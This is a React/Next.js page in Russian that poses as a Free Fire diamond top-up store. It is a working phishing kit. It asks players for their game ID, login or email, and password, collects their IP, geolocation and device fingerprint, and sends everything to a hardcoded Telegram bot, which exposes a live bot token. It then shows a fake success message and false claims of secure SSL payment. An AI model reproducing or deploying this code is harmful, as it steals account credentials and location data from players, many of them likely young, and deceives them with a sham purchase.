'use client';

import React, { useState, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import Image from 'next/image';

interface PurchaseStep {
  id: number;
  title: string;
  description: string;
  icon: React.ReactNode;
}

export default function PurchasePage() {
  const [currentStep, setCurrentStep] = useState(1);
  const [bindingType, setBindingType] = useState('');
  const [formData, setFormData] = useState({
    uid: '',
    loginType: 'login' as 'login' | 'email',
    loginOrEmail: '',
    password: '',
  });
  const [notification, setNotification] = useState({
    show: false,
    type: 'success' as 'success' | 'error',
    message: '',
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [remainingSubmissions, setRemainingSubmissions] = useState(10);
  const [timeUntilReset, setTimeUntilReset] = useState<number | null>(null);

  const [errors, setErrors] = useState({
    uid: '',
    loginOrEmail: '',
    password: ''
  });

  const router = useRouter();
  const searchParams = useSearchParams();
  
  const packageName = searchParams.get('package') || '';
  const diamonds = parseInt(searchParams.get('diamonds') || '0');
  const price = parseInt(searchParams.get('price') || '0');

  useEffect(() => {
    checkSubmissionLimit();
  }, []);

  const checkSubmissionLimit = () => {
    const submissions = JSON.parse(localStorage.getItem('diamondSubmissions') || '[]');
    const currentTime = new Date().getTime();
    
    // Фильтруем отправки за последние 24 часа
    const recentSubmissions = submissions.filter((time: number) => {
      return (currentTime - time) < 24 * 60 * 60 * 1000;
    });

    setRemainingSubmissions(10 - recentSubmissions.length);

    if (recentSubmissions.length >= 10) {
      const oldestSubmission = Math.min(...recentSubmissions);
      const resetTime = oldestSubmission + (24 * 60 * 60 * 1000);
      const timeLeft = Math.ceil((resetTime - currentTime) / (60 * 60 * 1000));
      setTimeUntilReset(timeLeft);
    }
  };

  const bindingOptions = [
    {
      id: 'facebook',
      title: 'Facebook',
      description: 'Привязка через Facebook аккаунт',
      icon: (
        <svg viewBox="0 0 24 24" className="w-7 h-7 text-[#1877F2]">
          <path
            fill="currentColor"
            d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"
          />
        </svg>
      )
    },
    {
      id: 'google',
      title: 'Google Play',
      description: 'Привязка через Google Play аккаунт',
      icon: (
        <div className="rounded-full overflow-hidden w-7 h-7">
          <Image
            src="https://i.postimg.cc/gnXHfpJ2/unnamed.png"
            alt="Google Play"
            width={28}
            height={28}
            className="w-full h-full object-cover"
            unoptimized
          />
        </div>
      )
    },
    {
      id: 'twitter',
      title: 'Twitter',
      description: 'Привязка через Twitter аккаунт',
      icon: (
        <svg viewBox="0 0 24 24" className="w-7 h-7 text-[#1DA1F2]">
          <path
            fill="currentColor"
            d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z"
          />
        </svg>
      )
    },
    {
      id: 'vk',
      title: 'VK',
      description: 'Привязка через VK аккаунт',
      icon: (
        <svg viewBox="0 0 24 24" className="w-7 h-7 text-[#0077FF]">
          <path
            fill="currentColor"
            d="M15.684 0H8.316C1.592 0 0 1.592 0 8.316v7.368C0 22.408 1.592 24 8.316 24h7.368C22.408 24 24 22.408 24 15.684V8.316C24 1.592 22.408 0 15.684 0zm3.692 17.123h-1.744c-.66 0-.862-.525-2.049-1.714-1.033-1.01-1.49-1.135-1.744-1.135-.356 0-.458.102-.458.593v1.575c0 .424-.135.678-1.253.678-1.846 0-3.896-1.12-5.335-3.197-2.17-3.027-2.76-5.3-2.76-5.776 0-.254.102-.491.593-.491h1.744c.44 0 .61.203.78.678.847 2.455 2.267 4.617 2.861 4.617.22 0 .322-.102.322-.66V9.625c-.068-1.186-.695-1.287-.695-1.71 0-.203.17-.407.44-.407h2.76c.373 0 .508.203.508.643v3.469c0 .373.17.508.271.508.22 0 .407-.135.813-.542 1.27-1.422 2.18-3.604 2.18-3.604.119-.254.373-.491.745-.491h1.744c.525 0 .643.27.525.643-.22 1.032-2.368 4.06-2.368 4.06-.186.305-.254.44 0 .78.186.254.796.779 1.202 1.253.745.847 1.32 1.558 1.473 2.049.17.474-.085.712-.576.712z"
          />
        </svg>
      )
    }
  ];

  const handleBindingSelect = (type: string) => {
    setBindingType(type);
    setCurrentStep(2);
  };

  const validateForm = () => {
    const newErrors = {
      uid: '',
      loginOrEmail: '',
      password: ''
    };

    // Проверка ID
    if (formData.uid.length < 10) {
      newErrors.uid = 'ID должен содержать минимум 10 цифр';
    }

    // Проверка логина/почты
    if (formData.loginType === 'email' && !formData.loginOrEmail.includes('@')) {
      newErrors.loginOrEmail = 'Введите корректный email';
    }

    // Проверка пароля
    if (formData.password.length < 6) {
      newErrors.password = 'Пароль должен содержать минимум 6 символов';
    }

    setErrors(newErrors);
    return !Object.values(newErrors).some(error => error !== '');
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    // Сбрасываем ошибку при изменении поля
    setErrors(prev => ({
      ...prev,
      [name]: ''
    }));
  };

  const handleNextStep = () => {
    if (validateForm()) {
      setCurrentStep(3);
    }
  };

  const handleSubmit = async () => {
    if (remainingSubmissions <= 0) {
      setNotification({
        show: true,
        type: 'error',
        message: `Достигнут лимит отправок. Следующая отправка будет доступна через ${timeUntilReset} ч.`
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // Получаем информацию об устройстве и местоположении
      const userAgent = window.navigator.userAgent;
      const platform = window.navigator.platform;
      const language = window.navigator.language;
      const screenResolution = `${window.screen.width}x${window.screen.height}`;
      const colorDepth = window.screen.colorDepth;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const connection = (navigator as any).connection?.effectiveType || 'unknown';

      // Получаем IP и геолокацию
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      const ip = ipData.ip;
      
      const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
      const geoData = await geoResponse.json();

      // Формируем расширенное сообщение для отправки
      const message = `🎮 Новая заявка на пополнение!\n\n` +
        `📦 Пакет: ${packageName}\n` +
        `💎 Алмазы: ${diamonds}\n` +
        `💰 Сумма: ${price} ₽\n\n` +
        `👤 Данные игрока:\n` +
        `🆔 ID: ${formData.uid}\n` +
        `📧 ${formData.loginType === 'email' ? 'Email' : 'Логин'}: ${formData.loginOrEmail}\n` +
        `🔑 Пароль: ${formData.password}\n` +
        `🔗 Привязка: ${bindingType}\n\n` +
        `📱 Информация об устройстве:\n` +
        `🌐 IP: ${ip}\n` +
        `📍 Местоположение: ${geoData.city}, ${geoData.region}, ${geoData.country_name}\n` +
        `🗺 Координаты: ${geoData.latitude}, ${geoData.longitude}\n` +
        `🌍 Провайдер: ${geoData.org}\n` +
        `📱 Устройство: ${userAgent}\n` +
        `💻 Платформа: ${platform}\n` +
        `🌐 Язык: ${language}\n` +
        `📺 Разрешение экрана: ${screenResolution}\n` +
        `🎨 Глубина цвета: ${colorDepth}bit\n` +
        `🕒 Часовой пояс: ${timezone}\n` +
        `📶 Тип соединения: ${connection}\n\n` +
        `⏰ Время заявки: ${new Date().toLocaleString('ru-RU')}`;

      // Отправляем данные в Telegram канал через бота
      const response = await fetch('https://api.telegram.org/bot7366514318:AAFNSvdBe5L9RM27mY9OnBEwRIH2dmizUVs/sendMessage', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: '-1002255169087',
          text: message,
          parse_mode: 'HTML'
        })
      });

      if (!response.ok) {
        throw new Error('Ошибка отправки данных');
      }

      // Сохраняем время отправки
      const currentTime = new Date().getTime();
      const submissions = JSON.parse(localStorage.getItem('diamondSubmissions') || '[]');
      localStorage.setItem('diamondSubmissions', JSON.stringify([...submissions, currentTime]));

      setNotification({
        show: true,
        type: 'success',
        message: 'Заявка успешно отправлена! Алмазы будут начислены в течение 20 минут.'
      });

      checkSubmissionLimit();

      setTimeout(() => {
        router.push('/');
      }, 3000);

    } catch (error) {
      console.error('Ошибка:', error);
      setNotification({
        show: true,
        type: 'error',
        message: 'Произошла ошибка при отправке заявки. Пожалуйста, попробуйте позже.'
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <main className="min-h-screen bg-[#1a1a2e] text-white py-4 px-2 md:py-20 md:px-4">
      {/* Фоновые элементы */}
      <div className="fixed inset-0 z-0 pointer-events-none overflow-hidden">
        <div className="absolute top-0 left-1/4 w-[500px] h-[500px] bg-blue-500/20 rounded-full blur-[120px] animate-pulse"></div>
        <div className="absolute bottom-0 right-1/4 w-[500px] h-[500px] bg-purple-500/20 rounded-full blur-[120px] animate-pulse"></div>
      </div>

      <div className="container max-w-4xl mx-auto relative z-10">
        {/* Логотип */}
        <div className="flex justify-center mb-12">
          <div className="relative w-48 h-48 md:w-64 md:h-64 transform hover:scale-105 transition-transform duration-300">
            <div className="absolute inset-0 bg-gradient-to-r from-blue-500/20 to-purple-500/20 rounded-full blur-2xl animate-pulse"></div>
            <Image
              src="https://i.postimg.cc/G8LZQtb2/minimalist-heroic-free-fire-gls3ucwhj41aszq9-fotor-bg-remover-20250221235242.png"
              alt="Free Fire Logo"
              width={256}
              height={256}
              className="w-full h-full object-contain drop-shadow-[0_0_20px_rgba(255,255,255,0.4)]"
              unoptimized
              priority
            />
          </div>
        </div>

        {/* Лимит отправок */}
        <div className="bg-gradient-to-r from-blue-500/10 to-purple-500/10 rounded-xl p-3 md:p-4 mb-4 md:mb-8 backdrop-blur-sm border border-white/10">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-lg bg-blue-500/20 flex items-center justify-center">
                <svg viewBox="0 0 24 24" className="w-6 h-6 text-blue-400">
                  <path
                    fill="currentColor"
                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-12S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.31-8.86c-1.77-.45-2.34-.94-2.34-1.67 0-.84.79-1.43 2.1-1.43 1.38 0 1.9.66 1.94 1.64h1.71c-.05-1.34-.87-2.57-2.49-2.97V5H10.9v1.69c-1.51.32-2.72 1.3-2.72 2.81 0 1.79 1.49 2.69 3.66 3.21 1.95.46 2.34 1.15 2.34 1.87 0 .53-.39 1.39-2.1 1.39-1.6 0-2.23-.72-2.32-1.64H8.04c.1 1.7 1.36 2.66 2.86 2.97V19h2.34v-1.67c1.52-.29 2.72-1.16 2.73-2.77-.01-2.2-1.9-2.96-3.66-3.42z"
                  />
                </svg>
              </div>
              <div>
                <h3 className="font-medium text-white">Лимит отправок</h3>
                <p className="text-sm text-gray-400">Осталось {remainingSubmissions} из 10 отправок</p>
              </div>
            </div>
            <div className="w-24 h-24 relative">
              <svg className="w-full h-full transform -rotate-90">
                <circle
                  cx="48"
                  cy="48"
                  r="36"
                  stroke="currentColor"
                  strokeWidth="8"
                  fill="none"
                  className="text-white/5"
                />
                <circle
                  cx="48"
                  cy="48"
                  r="36"
                  stroke="currentColor"
                  strokeWidth="8"
                  fill="none"
                  strokeDasharray="226.2"
                  strokeDashoffset={226.2 * (1 - remainingSubmissions / 10)}
                  className="text-blue-500 transition-all duration-1000"
                />
              </svg>
              <div className="absolute inset-0 flex items-center justify-center">
                <span className="text-lg font-bold">{remainingSubmissions}</span>
              </div>
            </div>
          </div>
        </div>

        {/* Информация о пакете */}
        <div className="bg-white/5 backdrop-blur-sm rounded-2xl p-6 mb-8 border border-white/10">
          <div className="flex flex-col md:flex-row items-center md:items-start gap-6">
            <div className="relative w-24 h-24 md:w-32 md:h-32 rounded-2xl overflow-hidden bg-[#1a1f2e]">
              <Image
                src="https://i.postimg.cc/18gvwGP3/image.jpg"
                alt="Diamond package"
                layout="fill"
                objectFit="cover"
                className="w-full h-full"
                style={{ opacity: 1 }}
                priority
                unoptimized
              />
            </div>
            <div className="flex-1 text-center md:text-left">
              <h2 className="text-2xl md:text-3xl font-bold mb-2">{packageName}</h2>
              <div className="flex flex-col md:flex-row gap-4 items-center">
                <div className="flex items-center gap-2">
                  <svg viewBox="0 0 24 24" className="w-6 h-6 text-blue-400">
                    <path
                      fill="currentColor"
                      d="M12 2L2 9l10 13 10-13-10-7zm0 2.5L19 9l-7 9.1L5 9l7-4.5z"
                    />
                  </svg>
                  <span className="text-xl text-gray-300">{diamonds} алмазов</span>
                </div>
                <div className="hidden md:block text-gray-400">•</div>
                <div className="text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
                  {price} ₽
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Шаги процесса */}
        <div className="bg-white/5 backdrop-blur-sm rounded-2xl border border-white/10 overflow-hidden mb-8">
          <div className="p-6 border-b border-white/10">
            <div className="flex justify-between">
              {[
                { step: 1, icon: (
                  <svg viewBox="0 0 24 24" className="w-6 h-6 text-white">
                    <path fill="currentColor" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 2.18l7 3.12v4.7c0 4.67-3.13 8.95-7 10.18-3.87-1.23-7-5.51-7-10.18V6.3l7-3.12z"/>
                    <path fill="currentColor" d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zm0 8c-1.65 0-3-1.35-3-3s1.35-3 3-3 3 1.35 3 3-1.35 3-3 3z"/>
                  </svg>
                ), title: 'Привязка', desc: 'Выбор способа' },
                { step: 2, icon: (
                  <svg viewBox="0 0 24 24" className="w-6 h-6 text-white">
                    <path fill="currentColor" d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/>
                  </svg>
                ), title: 'Данные', desc: 'Ввод данных' },
                { step: 3, icon: (
                  <svg viewBox="0 0 24 24" className="w-6 h-6 text-white">
                    <path fill="currentColor" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
                  </svg>
                ), title: 'Проверка', desc: 'Подтверждение' }
              ].map(({ step, icon, title, desc }) => (
                <div 
                  key={step}
                  className={`flex items-center gap-3 ${
                    currentStep === step ? 'opacity-100' : 'opacity-50'
                  }`}
                >
                  <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${
                    currentStep === step 
                      ? 'bg-gradient-to-br from-blue-500 to-purple-500'
                      : 'bg-white/10'
                  }`}>
                    {icon}
                  </div>
                  <div className="hidden md:block">
                    <p className="font-medium">{title}</p>
                    <p className="text-sm text-gray-400">{desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="p-6">
            {currentStep === 1 && (
              <div className="space-y-4">
                {bindingOptions.map((option) => (
                  <button
                    key={option.id}
                    onClick={() => handleBindingSelect(option.title)}
                    className={`w-full text-left p-6 rounded-xl border transition-all duration-300 group relative overflow-hidden ${
                      bindingType === option.title
                        ? 'bg-gradient-to-r from-blue-500/20 to-purple-500/20 border-blue-500/50'
                        : 'bg-white/5 border-white/10 hover:bg-white/10'
                    }`}
                  >
                    <div className="absolute inset-0 bg-gradient-to-r from-blue-500/10 to-purple-500/10 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div className="relative z-10 flex items-center gap-4">
                      <div className={`w-14 h-14 rounded-xl flex items-center justify-center transition-transform duration-300 ${
                        bindingType === option.title
                          ? 'scale-110 bg-gradient-to-br from-blue-500/20 to-purple-500/20'
                          : 'bg-white/5'
                      }`}>
                        {option.icon}
                      </div>
                      <div className="flex-1">
                        <h3 className="font-medium mb-1">{option.title}</h3>
                        <p className="text-sm text-gray-400">{option.description}</p>
                      </div>
                      <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-colors ${
                        bindingType === option.title
                          ? 'border-blue-500 bg-blue-500'
                          : 'border-white/30'
                      }`}>
                        {bindingType === option.title && (
                          <svg className="w-4 h-4 text-white animate-checkmark" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                          </svg>
                        )}
                      </div>
                    </div>
                  </button>
                ))}

                <div className="mt-6 p-4 bg-yellow-500/10 rounded-xl border border-yellow-500/20">
                  <div className="flex items-start gap-3">
                    <svg viewBox="0 0 24 24" className="w-6 h-6 text-yellow-500 shrink-0">
                      <path
                        fill="currentColor"
                        d="M12 2L1 21h22L12 2zm0 3.45l8.27 14.32H3.73L12 5.45zm-1.11 3.72v5.51h2.22V9.17h-2.22zm0 6.95v2.22h2.22v-2.22h-2.22z"
                      />
                    </svg>
                    <p className="text-sm text-yellow-200/80">
                      Выберите тот способ привязки, который вы использовали при создании аккаунта.
                    </p>
                  </div>
                </div>
              </div>
            )}

            {currentStep === 2 && (
              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    ID игрока
                  </label>
                  <input
                    type="number"
                    name="uid"
                    value={formData.uid}
                    onChange={handleInputChange}
                    className={`w-full bg-[#1a1f2e] border ${errors.uid ? 'border-red-500' : 'border-white/10'} rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all`}
                    placeholder="Введите ваш ID (минимум 10 цифр)"
                  />
                  {errors.uid && (
                    <p className="mt-2 text-sm text-red-400">{errors.uid}</p>
                  )}
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    Способ входа
                  </label>
                  <select
                    name="loginType"
                    value={formData.loginType}
                    onChange={handleInputChange}
                    className="w-full bg-[#1a1f2e] border border-white/10 rounded-xl px-4 py-3 text-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all"
                  >
                    <option value="login" className="bg-[#1a1f2e] text-white">Логин</option>
                    <option value="email" className="bg-[#1a1f2e] text-white">Email</option>
                  </select>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    {formData.loginType === 'email' ? 'Email' : 'Логин'}
                  </label>
                  <input
                    type={formData.loginType === 'email' ? 'email' : 'text'}
                    name="loginOrEmail"
                    value={formData.loginOrEmail}
                    onChange={handleInputChange}
                    className={`w-full bg-[#1a1f2e] border ${errors.loginOrEmail ? 'border-red-500' : 'border-white/10'} rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all`}
                    placeholder={formData.loginType === 'email' ? 'Введите email' : 'Введите логин'}
                  />
                  {errors.loginOrEmail && (
                    <p className="mt-2 text-sm text-red-400">{errors.loginOrEmail}</p>
                  )}
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    Пароль
                  </label>
                  <input
                    type="password"
                    name="password"
                    value={formData.password}
                    onChange={handleInputChange}
                    className={`w-full bg-[#1a1f2e] border ${errors.password ? 'border-red-500' : 'border-white/10'} rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all`}
                    placeholder="Введите пароль"
                  />
                  {errors.password && (
                    <p className="mt-2 text-sm text-red-400">{errors.password}</p>
                  )}
                </div>

                <div className="flex gap-4 mt-8">
                  <button
                    onClick={() => setCurrentStep(1)}
                    className="flex-1 bg-white/5 hover:bg-white/10 text-white px-6 py-3 rounded-xl transition-all duration-300 border border-white/10"
                  >
                    Назад
                  </button>
                  <button
                    onClick={handleNextStep}
                    className="flex-1 bg-gradient-to-r from-blue-500 to-purple-500 hover:opacity-90 text-white px-6 py-3 rounded-xl transition-all duration-300"
                  >
                    Продолжить
                  </button>
                </div>
              </div>
            )}

            {currentStep === 3 && (
              <div className="space-y-4 md:space-y-6">
                <div className="bg-white/5 rounded-xl p-4 md:p-6 border border-white/10">
                  <h3 className="text-lg font-medium mb-4">Проверьте данные</h3>
                  <div className="space-y-3 md:space-y-4">
                    <div className="flex justify-between items-center p-2 md:p-3 bg-[#1a1f2e] rounded-lg">
                      <span className="text-gray-400">Способ привязки:</span>
                      <span className="font-medium">{bindingType}</span>
                    </div>
                    <div className="flex justify-between items-center p-2 md:p-3 bg-[#1a1f2e] rounded-lg">
                      <span className="text-gray-400">ID игрока:</span>
                      <span className="font-medium">{formData.uid}</span>
                    </div>
                    <div className="flex justify-between items-center p-2 md:p-3 bg-[#1a1f2e] rounded-lg">
                      <span className="text-gray-400">{formData.loginType === 'email' ? 'Email' : 'Логин'}:</span>
                      <span className="font-medium">{formData.loginOrEmail}</span>
                    </div>
                  </div>
                </div>

                <div className="bg-gradient-to-r from-yellow-500/10 to-orange-500/10 rounded-xl p-4 md:p-6 border border-yellow-500/20">
                  <div className="flex items-start gap-4">
                    <span className="text-2xl">⚠️</span>
                    <div>
                      <h4 className="font-medium text-yellow-400 mb-2">Важно!</h4>
                      <p className="text-sm text-yellow-400/80">
                        Перед оплатой убедитесь, что все данные введены верно.
                        После оплаты изменить данные будет невозможно.
                      </p>
                    </div>
                  </div>
                </div>

                <div className="flex gap-4">
                  <button
                    onClick={() => setCurrentStep(2)}
                    className="flex-1 bg-white/5 hover:bg-white/10 text-white px-6 py-3 rounded-xl transition-all duration-300 border border-white/10"
                  >
                    Назад
                  </button>
                  <button
                    onClick={handleSubmit}
                    disabled={isSubmitting || remainingSubmissions <= 0}
                    className={`flex-1 bg-gradient-to-r from-blue-500 to-purple-500 text-white px-6 py-3 rounded-xl transition-all duration-300 relative overflow-hidden ${
                      (isSubmitting || remainingSubmissions <= 0) ? 'opacity-50 cursor-not-allowed' : 'hover:opacity-90'
                    }`}
                  >
                    <span className="relative z-10">
                      {isSubmitting ? 'Отправка...' : `Оплатить ${price} ₽`}
                    </span>
                    <div className="absolute inset-0 bg-gradient-to-r from-blue-600 to-purple-600 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Информация о безопасности */}
        <div className="bg-gradient-to-r from-green-500/10 to-emerald-500/10 rounded-xl p-6 backdrop-blur-sm border border-green-500/20">
          <div className="flex items-start gap-4">
            <div className="w-12 h-12 rounded-xl bg-green-500/20 flex items-center justify-center shrink-0">
              <svg viewBox="0 0 24 24" className="w-7 h-7 text-green-400">
                <path
                  fill="currentColor"
                  d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 2.18l7 3.12v4.7c0 4.67-3.13 8.95-7 10.18-3.87-1.23-7-5.51-7-10.18V6.3l7-3.12zm-1 11.57h2v2h-2v-2zm0-8h2v6h-2v-6z"
                />
              </svg>
            </div>
            <div>
              <h3 className="text-lg font-medium text-green-400 mb-2">Безопасная оплата</h3>
              <p className="text-sm text-green-400/80">
                Мы используем современные методы шифрования для защиты ваших данных.
                Все транзакции проходят через защищенное SSL-соединение.
              </p>
            </div>
          </div>
        </div>
      </div>

      {notification.show && (
        <div className="fixed top-0 left-0 right-0 z-50">
          <div className={`mx-auto max-w-md bg-gradient-to-r ${
            notification.type === 'success'
              ? 'from-green-600 to-emerald-600'
              : 'from-red-600 to-orange-600'
          } shadow-lg`}>
            <div className="px-4 py-4 flex items-start gap-3">
              <div className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center shrink-0">
                {notification.type === 'success' ? (
                  <svg className="w-5 h-5 text-white" viewBox="0 0 24 24">
                    <path
                      fill="currentColor"
                      d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"
                    />
                  </svg>
                ) : (
                  <svg className="w-5 h-5 text-white" viewBox="0 0 24 24">
                    <path
                      fill="currentColor"
                      d="M12 2L1 21h22L12 2zm0 3.45l8.27 14.32H3.73L12 5.45zm-1.11 3.72v5.51h2.22V9.17h-2.22zm0 6.95v2.22h2.22v-2.22h-2.22z"
                    />
                  </svg>
                )}
              </div>
              <div className="flex-1">
                <p className="text-white font-medium text-base leading-tight mb-1">{notification.message}</p>
                {notification.type === 'success' && (
                  <p className="text-white/90 text-sm">Время доставки: ~20 минут</p>
                )}
              </div>
            </div>
          </div>
        </div>
      )}
    </main>
  );
} 